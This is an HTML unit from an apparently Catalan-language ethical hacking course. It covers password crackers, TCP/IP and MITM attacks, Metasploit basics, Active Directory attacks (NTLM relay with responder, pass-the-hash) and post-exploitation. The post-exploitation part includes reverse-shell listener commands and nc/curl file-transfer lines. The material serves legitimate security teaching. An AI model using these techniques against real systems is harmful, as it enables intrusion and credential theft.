  <p>    John the Ripper √©s conegut per la seva    <strong>versatilitat i simplicitat</strong>. √âs especialment √∫til    en entorns on es vol fer una primera avaluaci√≥ r√†pida    o quan es treballa amb formats de hash diversos.  </p>

  <strong>Avantatges:</strong>
  <ul>
    <li>F√†cil d‚Äôutilitzar i d‚Äôinterpretar</li>
    <li>Bona gesti√≥ de diccionaris i regles</li>
    <li>Ideal per a proves inicials</li>
    <li>Funciona b√© en entorns sense GPU</li>
  </ul>

  <strong>Limitacions:</strong>
  <ul>
    <li>Menor rendiment comparat amb GPU</li>
    <li>Escala pitjor en grans volums</li>
  </ul>

  <h3>Hashcat</h3>
  <p>    Hashcat est√† orientat al    <strong>m√†xim rendiment possible</strong>, especialment amb GPU.    √âs l‚Äôeina preferida quan es necessita    analitzar grans conjunts de hashes de manera eficient.  </p>

  <strong>Avantatges:</strong>
  <ul>
    <li>Extremadament r√†pid amb GPU</li>
    <li>Escala molt b√© en entorns grans</li>
    <li>Gran control sobre estrat√®gies avan√ßades</li>
    <li>Ideal per a proves de resist√®ncia</li>
  </ul>

  <strong>Limitacions:</strong>
  <ul>
    <li>Corba d‚Äôaprenentatge m√©s pronunciada</li>
    <li>Depend√®ncia de maquinari potent</li>
  </ul>

  <h3>Quina eina triar en un pentest?</h3>
  <ul>
    <li>      <strong>John the Ripper</strong> √©s ideal per a      proves r√†pides, entorns petits o formaci√≥.    </li>
    <li>      <strong>Hashcat</strong> √©s m√©s adequat per a      auditories exhaustives i entorns amb GPU.    </li>
    <li>
      En molts pentests professionals,      <strong>s‚Äôutilitzen de manera complement√†ria</strong>.
    </li>
  </ul>
  <hr><h3>Eines de cracking online</h3>
  <ol>
    <li>Hydra: Suporta gran quantiat de protocols</li>
    <li>Medusa: Igual que Hydra, per√≤ amb suport multifil</li>
    <li>Ncrack:  Del creador de nmap. Es pot trobar en la p√†gina de nmap</li>
  </ol>

    </section>         

    <section id="tcp">
    <h1>Atacs tcp/ip</h1>
 <h2>Par√†metres i Vectors d‚ÄôAtac a TCP/IP</h2>

  <p>    El conjunt de protocols <strong>TCP/IP</strong> √©s la base de les comunicacions    en xarxa. La seva flexibilitat i antiguitat fan que determinats    <strong>par√†metres i camps de protocol</strong> puguin ser objecte d‚Äôabusos    si no s‚Äôapliquen controls adequats.  </p>

  <h3>Qu√® s‚Äôent√©n per ‚Äúpar√†metres‚Äù en atacs TCP/IP?</h3>
  <p>    S√≥n camps, valors o comportaments dels protocols de xarxa    (IP, TCP, UDP, ICMP) que poden ser manipulats per    provocar <strong>interrupci√≥ del servei, evasi√≥ de controls    o degradaci√≥ de la seguretat</strong>.  </p>

  <h3>Par√†metres rellevants a nivell IP</h3>
  <ul>
    <li>      <strong>Adre√ßa IP origen/dest√≠</strong><br>      Pot ser objecte de suplantaci√≥ (spoofing) si no hi ha filtratge.    </li>
    <li>      <strong>TTL (Time To Live)</strong><br>      El seu valor pot influir en la detecci√≥ de rutes i dispositius.    </li>
    <li>      <strong>Fragmentaci√≥</strong><br>      Paquets fragmentats poden dificultar la inspecci√≥ del tr√†nsit.    </li>
  </ul>

  <h3>Par√†metres rellevants a nivell TCP</h3>
  <ul>
    <li>      <strong>Ports origen i dest√≠</strong><br>      Utilitzats per identificar serveis i canals de comunicaci√≥.    </li>
    <li>      <strong>Flags TCP (SYN, ACK, FIN, RST)</strong><br>      El seu √∫s indegut pot provocar esgotament de recursos o      confusi√≥ d‚Äôestat.    </li>
    <li>      <strong>N√∫mero de seq√º√®ncia</strong><br>      Clau per al control de sessi√≥ i la integritat de la connexi√≥.    </li>
    <li>      <strong>Window Size</strong><br>      Pot afectar el rendiment i la gesti√≥ del flux.    </li>
  </ul>

  <h3>Par√†metres rellevants a UDP</h3>
  <ul>
    <li>      <strong>Abs√®ncia d‚Äôestat</strong><br>      UDP no valida sessions, fet que pot facilitar abusos      si no hi ha controls addicionals.    </li>
    <li>      <strong>Ports i serveis</strong><br>      Sovint utilitzats en serveis cr√≠tics o de temps real.    </li>
  </ul>

  <h3>Par√†metres rellevants a ICMP</h3>
  <ul>
    <li>      <strong>Tipus i codi</strong><br>      Determinen la funci√≥ del missatge (errors, eco, redireccions).    </li>
    <li>      <strong>Freq√º√®ncia de missatges</strong><br>      Un √∫s excessiu pot degradar el servei.    </li>
  </ul>

  <h3>Impactes potencials</h3>
  <ul>
    <li>Denegaci√≥ de servei (DoS)</li>
    <li>Evasi√≥ de mecanismes de seguretat</li>
    <li>Interrupci√≥ de comunicacions</li>
    <li>Degradaci√≥ del rendiment de xarxa</li>
  </ul>


    <h2>MITM</h2>
<p>Un atac <strong>Man-in-the-Middle (MitM)</strong> es produeix quan un atacant s‚Äôinterposa entre dues parts que es 
  comuniquen, fent-se passar per cadascuna    d‚Äôelles sense que ho s√†piguen. L‚Äôobjectiu principal √©s <strong>interceptar, modificar o espiar la comunicaci√≥</strong>.  </p>

  <ul><strong>On poden produir-se els atacs MitM?</strong>
    <li>Xarxes Wi-Fi obertes o mal configurades</li>
    <li>Xarxes locals (LAN)</li>
    <li>Comunicacions no xifrades</li>
    <li>Entorns amb manca de validaci√≥ d‚Äôidentitat</li>
  </ul>  
  <ul> <strong>Objectius habituals d‚Äôun MitM</strong>
    <li>Captura de credencials</li>
    <li>Espionatge de dades sensibles</li>
    <li>Manipulaci√≥ de la informaci√≥ transmesa</li>
    <li>Segrest de sessions</li>
  </ul>

  <ul> <strong>Mecanismes d'atac</strong>
    <li>ARP Cache poisoning</li>
    <li>DNS Spoofing</li>
    <li>Session Hijacking</li>
    <li>SSL Hijacking</li>
  </ul>
  <ul><strong>Eines:</strong>
    <li>ettercap</li>
    <li>Bettercap</li>
    <li>dsniff</li>
  </ul>

    <h2>MAC flooding</h2>
   <p> El <strong>MAC Flooding</strong> √©s un atac a nivell de    <strong>xarxa local (Layer 2 ‚Äì Ethernet)</strong> que t√© com a objectiu    saturar la taula d‚Äôadreces MAC d‚Äôun <strong>switch</strong>.
    Quan aix√≤ passa, el dispositiu pot comen√ßar a comportar-se    com un hub, reenviant tr√†nsit per tots els ports.  </p>

  <h3>Com funciona un switch normalment?</h3>
  <p>    Un switch mant√© una <strong>taula MAC (CAM table)</strong> que associa:  </p>
  <ul>
    <li>Adre√ßa MAC</li>
    <li>Port f√≠sic</li>
  </ul>
  <p>    Aix√≤ permet enviar cada paquet nom√©s al destinatari correcte,    millorant el rendiment i la seguretat.  </p>

  <h3>Qu√® passa en un atac de MAC Flooding?</h3>
  <ul><strong>   Durant un MAC Flooding: </strong>
    <li>El switch rep un gran nombre d‚Äôadreces MAC diferents</li>
    <li>La taula MAC s‚Äôomple fins al l√≠mit</li>
    <li>El switch no pot aprendre noves associacions</li>
    <li>El tr√†nsit es reenvia per m√∫ltiples ports</li>
  </ul>

  <ul> <strong>Objectius de l‚Äôatac</strong>
    <li>Interceptar tr√†nsit d‚Äôaltres dispositius</li>
    <li>Facilitar atacs de tipus MitM</li>
    <li>Degradar el rendiment de la xarxa</li>
    <li>Explotar una configuraci√≥ insegura de la LAN</li>
  </ul>
  <ul><strong>Eines:</strong>
    <li>macof</li>
    <li>ettercap</li>
    <li>yersinia</li>
  </ul>
  <p> ****  TryHackMe disposa d'un laboratori per practicar estos atacs</p>

    </section>         


    <section id="metasploit">
    <h1>METASPLOIT</h1>
  <p> <strong>Metasploit</strong> √©s un <strong>framework de seguretat</strong> utilitzat principalment en <strong>pentesting
     i red team</strong> per identificar, validar i demostrar vulnerabilitats en sistemes inform√†tics de manera controlada i autoritzada.  </p>
     <p>desenvolupat per la empresa Rapid7, te una versi√≥ de codi font obert i una versi√≥ <strong>pro</strong> comercial de pagament</p>
     <p>Per aprofundir en l'us i funcionament existeixen diversos recursos. </p>
     <li>Documentaci√≥ oficial de Rapid7</li>
     <li>Curs online gratuit <strong>Metaspoloit Unleashed</strong> de Offensive Security</li>
     <li>Sistemes vulnerables <strong>metasploitable</strong>: Hi ha tres</li>

  <h3>Qu√® √©s un framework?</h3>
  <p> A difer√®ncia d‚Äôuna eina simple, Metasploit proporciona una  <strong>plataforma modular</strong> que permet integrar
     exploits, c√†rregues, auxiliars i eines posteriors a l‚Äôexplotaci√≥  dins d‚Äôun mateix entorn de treball.  </p>

  <h3>Objectiu principal</h3>
  <ul> Metasploit no est√† pensat nom√©s per ‚Äúexplotar sistemes‚Äù, sin√≥ per:
    <li>Validar vulnerabilitats reals</li>
    <li>Mesurar l‚Äôimpacte de fallades de seguretat</li>
    <li>Reproduir escenaris d‚Äôatac realistes</li>
    <li>Ajudar a millorar les defenses</li>
  </ul>

  <h3>Components principals</h3>
  <ul>
    <li>      <strong>Exploits</strong><br>
      Codi que aprofita una vulnerabilitat concreta.    </li>
    <li>      <strong>Payloads</strong><br>
      Accions que s‚Äôexecuten despr√©s d‚Äôuna explotaci√≥ amb √®xit.    </li>
    <li>      <strong>Auxiliars</strong><br>
      M√≤duls de suport per escaneig, enumeraci√≥ i validaci√≥.    </li>
    <li>      <strong>Post-explotaci√≥</strong><br>
      Funcionalitats per analitzar l‚Äôimpacte un cop obtingut acc√©s.    </li>
  </ul>

  <h3>Avantatges de Metasploit</h3>
  <ul>
    <li>Gran comunitat i actualitzacions constants</li>
    <li>Estandarditzaci√≥ del proc√©s de pentesting</li>
    <li>Permet demostrar impactes reals a nivell executiu</li>
    <li>Integraci√≥ amb altres eines de seguretat</li>
  </ul>

  <h3>Limitacions</h3>
  <ul>
    <li>No substitueix l‚Äôan√†lisi manual</li>
    <li>Algunes vulnerabilitats no tenen exploit p√∫blic</li>
    <li>Pot generar fals sentiment de seguretat si s‚Äôusa malament</li>
  </ul>

<h2>Arquitectura de metasploit</h2>
  <p><strong>Metasploit Framework</strong> est√† dissenyat com una <strong>arquitectura modular</strong> que permet desenvolupar, 
    integrar i executar diferents components de seguretat dins d‚Äôun mateix entorn. Aquesta arquitectura facilita la reutilitzaci√≥
     de codi, l‚Äôescalabilitat i l‚Äôextensibilitat.  </p>

  <h3>Principi clau: Arquitectura modular</h3>
  <p>  Metasploit separa clarament les funcionalitats en m√≤duls    independents. Cada m√≤dul compleix una funci√≥ concreta    i pot combinar-se amb altres sense modificar el nucli.  </p>

  <h3>Components principals de l‚Äôarquitectura</h3>

  <h4>1. Core (Nucli de Metasploit)</h4>
  <p>    El <strong>Metasploit Core</strong> √©s el motor del framework.    Gestiona:  </p>
  <ul>
    <li>La c√†rrega i execuci√≥ de m√≤duls</li>
    <li>La comunicaci√≥ entre components</li>
    <li>La gesti√≥ de sessions</li>
    <li>La interf√≠cie amb l‚Äôusuari</li>
  </ul>

  <h4>2. M√≤duls</h4>
  <p>    Els m√≤duls s√≥n peces funcionals que s‚Äôexecuten sobre el core.  Es divideixen en diferents categories:  </p>
  <ul>
    <li>      <strong>Exploits</strong>: representen vulnerabilitats espec√≠fiques    </li>
    <li>      <strong>Payloads</strong>: accions que s‚Äôexecuten despr√©s de l‚Äôexplotaci√≥    </li>
    <li>      <strong>Auxiliary</strong>: escaneig, enumeraci√≥ i validaci√≥    </li>
    <li>      <strong>Post</strong>: accions de post-explotaci√≥ i an√†lisi d‚Äôimpacte    </li>
    <li>      <strong>Encoders</strong>: transformaci√≥ de dades    </li>
    <li>      <strong>NOPs</strong>: suport per a l‚Äôestabilitat del codi    </li>
  </ul>

  <h4>3. Payload Architecture</h4>
  <p>  Els payloads tenen una arquitectura pr√≤pia i es poden combinar:  </p>
  <ul>
    <li>Payloads individuals (single)</li>
    <li>Payloads en etapes (staged)</li>
    <li>Payloads adaptats al sistema objectiu</li>
  </ul>
  <p>    Aquesta separaci√≥ permet reutilitzar payloads amb diferents exploits.  </p>

  <h4>4. Gesti√≥ de sessions</h4>
  <p>    Metasploit mant√© una <strong>capa de gesti√≥ de sessions</strong> que    permet interactuar amb sistemes compromesos de forma controlada:  </p>
  <ul>
    <li>Seguiment de connexions actives</li>
    <li>Persist√®ncia de context</li>
    <li>Execuci√≥ de m√≤duls posteriors</li>
  </ul>

    <h2>√ös b√†sic</h2>
     <p>Metasploit disposa d'una base de dades PostGreSQL, i una comanda per manipular: <strong>msfdb</strong></p>
    <pre>msfdb init | reinit | delete | start | stop |status | run      </pre>
    <p>La primera vegada, init i start, i despr√©s sols start</p>
    <p>Una comanda  <strong>msfconsole</strong>  , per entrar, i es mostrar√†..</p>
    <pre>msf6 ></pre>
    <p>altres comandes inicials</p>
   <pre>db_status  banner  color   history  version  tips   exit o quit </pre>

    <h3>Gestio de workspaces</h3>
    <p>Es un area de treball on guardar la informaci√≥ de manera com√∫. L'habitual es crear un per cada projecte</p>
    <pre>workspace   -- llista els workspaces
workspace name    -- cambia al workspace name
opcions: -a --add name  -d --delete name   -r --rename old new    -v 
    </pre>

    <h2>Gesti√≥ de m√≤duls</h2>
    <p>La gesti√≥ de m√≤duls es fonamental per conduir metasploit</p>
    <pre>search   o    help search 
msf6 > search smb
msf6 > search type:auxiliary smb
msf6 > search type:exploit smb
msf6 > search cve:2014-3791
msf6 > search type:exploit arch:x86 platform:Windows     </pre>
    <h3>C√†rrega i configuraci√≥ de m√≤duls </h3>
    <p>Una vegada es fa la cerca, es mostren resultats, numerats. Es pot fer un <code>info</code> i a continuaci√≥ 
    el num, o un <code>use</code> i a continuaci√≥ el num</p>
    <p>Si es fa un <code>info</code>, ens mostra l'autor, i si soporta un <code>check</code></p>
    <p>La secci√≥ m√©s important es <code>Basic options</code> on es mostren les opcions o variables que te el m√≤dul</p>
    <p>Tamb√© diu els <code>Current setting</code> i si es <code>Required</code> o no, i una columna de <code>Description</code></p>
    <p>Els valors es podran establir en usar el m√≤dul <code>use</code></p>
    <p>Una vegada fem un <code>use</code> del m√≤dul, cambia el prompt, i es podr√† executar <code>info</code> o <code>options</code> </p>
    <p>La comanda <code>set</code> per a posar valors a les variables i la comanda <code>unset</code> per llevar valors</p>
    <p>Existeix la comanda <code>setg i unsetg</code> per posar o llevar valors de forma global</p>
    <p>I una vegada amb tots els valors establits, es pot llan√ßar amb <code>run</code> o <code>exploit</code></p>
  

    </section>             

    <section id="ad">
    <h1>Atacs empresarials (Active Directory)</h1>


    <h2>Introducci√≥ a AD</h2>
  <p>    <strong>Active Directory (AD)</strong> √©s el servei de    <strong>directori de Microsoft</strong> utilitzat per gestionar    identitats, recursos i pol√≠tiques dins d‚Äôuna xarxa empresarial.    √âs un component clau en la majoria d‚Äôentorns Windows corporatius.  </p>

  <h3>Qu√® √©s un servei de directori?</h3>
  <p>    Un servei de directori √©s una base de dades centralitzada que    emmagatzema informaci√≥ sobre objectes de la xarxa i permet    <strong>autenticaci√≥, autoritzaci√≥ i administraci√≥ centralitzada</strong>.  </p>

<h3>Per qu√® Active Directory √©s tan important?</h3>
  <ul>
    <li>Centralitza la gesti√≥ d‚Äôusuaris i equips</li>
    <li>Controla l‚Äôacc√©s als recursos</li>
    <li>Aplica pol√≠tiques de seguretat</li>
    <li>Escala f√†cilment en entorns grans</li>
  </ul>

  <h3>Conceptes b√†sics d‚ÄôActive Directory</h3>

  <h4>Domini</h4>
  <p>    Un <strong>domini</strong> √©s una unitat administrativa l√≤gica    que agrupa usuaris, equips i recursos sota una mateixa    pol√≠tica de seguretat.  </p>

  <h4>Controlador de Domini (Domain Controller)</h4>
  <p>    El <strong>Domain Controller (DC)</strong> √©s el servidor que    allotja Active Directory i s‚Äôencarrega de:  </p>
  <ul>
    <li>Autenticar usuaris</li>
    <li>Aplicar pol√≠tiques</li>
    <li>Replicar informaci√≥ amb altres DC</li>
  </ul>

  <h4>Objectes</h4>
  <p>    AD gestiona diferents tipus d‚Äôobjectes:  </p>
  <ul>
    <li>Usuaris</li>
    <li>Equips</li>
    <li>Grups</li>
    <li>Impressores</li>
    <li>Serveis</li>
  </ul>

  <h4>Unitats Organitzatives (OU)</h4>
  <p>    Les <strong>OU</strong> permeten organitzar objectes    de manera jer√†rquica i aplicar pol√≠tiques espec√≠fiques.  </p>

  <h3>Autenticaci√≥ a Active Directory</h3>
  <p>    AD utilitza principalment:  </p>
  <ul>
    <li>Kerberos (protocol principal)</li>
    <li>NTLM (per compatibilitat)</li>
  </ul>

  <h3>Group Policy (GPO)</h3>
  <p>    Les <strong>Group Policies</strong> permeten definir i aplicar    configuracions de seguretat i sistema de manera centralitzada:  </p>
  <ul>
    <li>Pol√≠tiques de contrasenyes</li>
    <li>Configuraci√≥ de sistemes</li>
    <li>Restriccions d‚Äô√∫s</li>
    <li>Execuci√≥ de scripts</li>
  </ul>  


    <h2>Configurar laboratori</h2>
    <p>Es necessita un Controlador de domini (windows server 2016, per exemple) i varios equips clients, W7 i W10 pro</p>
    <p>Posar ip fixa en el servidor, i desactivar el firewall i Windows Defender en tots els equips.</p>
    <p>Crear usuaris en el server, perque els clients puguen unir-se al domini. Posteriorment, unir els equips clients al domini</p>

    <h2>Atacs NTLM Relay</h2>
    <p>En un atac NTLM Relay, un atacant s'interposa en una conversa d'autenticaci√≥ entre dos sistemes i retransmet 
      les sol¬∑licituds d'autenticaci√≥ a trav√©s d'un atac d'intermediari (relay). L'objectiu principal d'aquest atac 
      √©s obtindre acc√©s no autoritzat a sistemes o recursos als quals l'atacant no t√© perm√≠s directe.</p>
    <p>Es pot fer una demostraci√≥ des d'una maquina kali, amb l'eina <code>responder</code></p>
    <pre>$ sudo responder -I eth0</pre>
    <p>Es posa en marxa la ferramenta i des d'un client s'intenta accedir a un recurs compartit, per exemple, una carpeta</p>
    <p>Al cap d'una estona, <code>responder</code> captura un HASH</p>
    <p> ** Una altra opci√≥ es utilitzar <code>responder</code> com a un servidor WPAD i for√ßar l'autenticaci√≥ b√†sica d'usuaris per obtenir les credencials en text pla</p>

    <h2>Password spraying</h2>
     <p>Una vegada es tenen unes credencials, es pot fer un <code>password spraying</code> intentant fer servir 
    estes credencials en altres serveis, recursos o m√†quines assolibles</p>
    <p>Una eina per fer este atac es <strong>crackmapexec</strong></p>

    <h2>Atac Pass the Hash</h2>
    <p>Un atac pass-the-hash (PtH) es produeix quan un atacant captura les credencials d'inici de sessi√≥ d'un compte
       (concretament els valors hash en lloc de les contrasenyes en text pla), des d'un dispositiu i utilitza els 
       valors hash capturats per a autenticar-se en altres dispositius o serveis dins d'una xarxa</p>
    <p>L'eina  <strong>crackmapexec</strong>, es pot fer servir per a recuperar hashes de SAM, amb l'opci√≥ --sam 
    i tamb√© per fer l'atac, amb l'opci√≤ -H </p>

    <!--     <h2>Atac a kerberos</h2>-->


    </section>             
 
    <section id="expl">
    <h1>Accions en la m√†quina explotada</h1>
    <h2>Reverse Shell </h2>
    <p>S'ha vist en el tema anterior com fer shell inversa en linux , aprofitant les vulnerabilitats web</p>
     <p>Es vora en este punt com fer el mateix amb Windows</p>
     <p>Una vegada connectats a una m√†quina Windows, utilitzarem Powershell per obrir connexions.</p>
     <p>En la web <code>PayloadsAllTheThings</code> hi ha diferents payloads per obtenir reverseShell. Copiem-peguem i executem</p>
     <p>Previament en la m√†quina kali hem d'escoltar amb <code>nc -lnvp 9000</code>, per exemple, encara que esta shell no estar√† estabilitzada</p>
     <pre>Per estabilitzar, es pot substituir la comanda anterior per:
rlwrap nc -lnvp 9000       </pre>
    <p>I si no esta en el nostre kali, la baixem amb apt install</p>
    <ol>Altres alternatives en Windows
      <li>ConPtyShell</li>
      <li>Nishang</li>
      <li>HoaxShell</li>
    </ol>
 

    <h2>Transfer√®ncia d'arxius</h2>
    <p>Amb netcat o amb un servidor HTTP</p>
    <h3>Amb nc</h3>
     <pre>En la m√†quina que envia el document
nc ip port < fitxer    </pre>
     <pre>En la m√†quina que rep el document
nc -lnvp port > fitxer    </pre>

    <h3>Amb HTTP</h3>
     <pre>En la m√†quina server. En una carpeta que tinga el fitxer/s 
sudo python3 -m http.server 80  </pre>
     <pre>En la m√†quina client
wget http://ip:port/recurs
o 
curl http://ip:puerto/recurs -o fitxer
</pre>


    </section>       
    

    <section id="labs">
    <h1>Laboratoris</h1>

    </section>         
   
      

    </main>

    <footer>
      <p style="font-family: 'CCSymbols', sans-serif; font-size:larger;" >
        2026 - Llic√®ncia: &#x1F16D; &#x1F16F; &#x1F10E; &#x1F10F; - U5 - HE a xarxes i sistemes 
      </p>
    </footer>
  </div>

  
    <script src="scriptsunitats.js"></script>
</body>
</html>
